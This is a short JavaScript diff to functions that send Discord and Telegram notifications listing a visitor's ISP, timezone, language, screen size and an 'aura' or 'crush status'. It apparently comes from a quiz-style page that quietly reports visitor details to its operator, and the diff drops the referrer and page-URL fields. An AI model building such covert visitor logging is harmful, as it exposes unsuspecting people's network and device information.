@@ -151,8 +151,6 @@ async function sendDiscordNotification(webhookUrl, entry) {
                     { name: '🗓️ Timezone',          value: entry.timezone,     inline: true  },
                     { name: '🔤 Language',          value: entry.language,     inline: true  },
                     { name: '📐 Screen',            value: entry.screenRes,    inline: true  },
-                    { name: '🔗 Referrer',          value: entry.referrer,     inline: false },
-                    { name: '📎 Page URL',          value: entry.pageUrl,      inline: false },
                     { name: '✨ Aura & Status',     value: `${entry.auraTag} | ${entry.crushStatus}`, inline: false },
                     { name: '⏰ Timestamp',         value: new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false }
                 ],
@@ -189,8 +187,6 @@ async function sendTelegramNotification(botToken, chatId, entry) {
         `🗓️ *Timezone*: ${entry.timezone}\n` +
         `🔤 *Language*: ${entry.language}\n` +
         `📐 *Screen*: ${entry.screenRes}\n` +
-        `🔗 *Referrer*: ${entry.referrer}\n` +
-        `📎 *URL*: ${entry.pageUrl}\n\n` +
         `✨ *Aura*: ${entry.auraTag}\n` +
         `🦋 *Status*: ${entry.crushStatus}\n` +
         `⏰ *Time*: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
@@ -221,9 +217,7 @@ async function sendTelegramNotification(botToken, chatId, entry) {
             `📡 ISP: ${entry.isp}\n\n` +
             `🗓️ Timezone: ${entry.timezone}\n` +
             `🔤 Language: ${entry.language}\n` +
-            `📐 Screen: ${entry.screenRes}\n` +
-            `🔗 Referrer: ${entry.referrer}\n` +
-            `📎 URL: ${entry.pageUrl}\n\n` +
+            `📐 Screen: ${entry.screenRes}\n\n` +
             `✨ Aura: ${entry.auraTag}\n` +
             `🦋 Status: ${entry.crushStatus}\n` +
             `⏰ Time: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
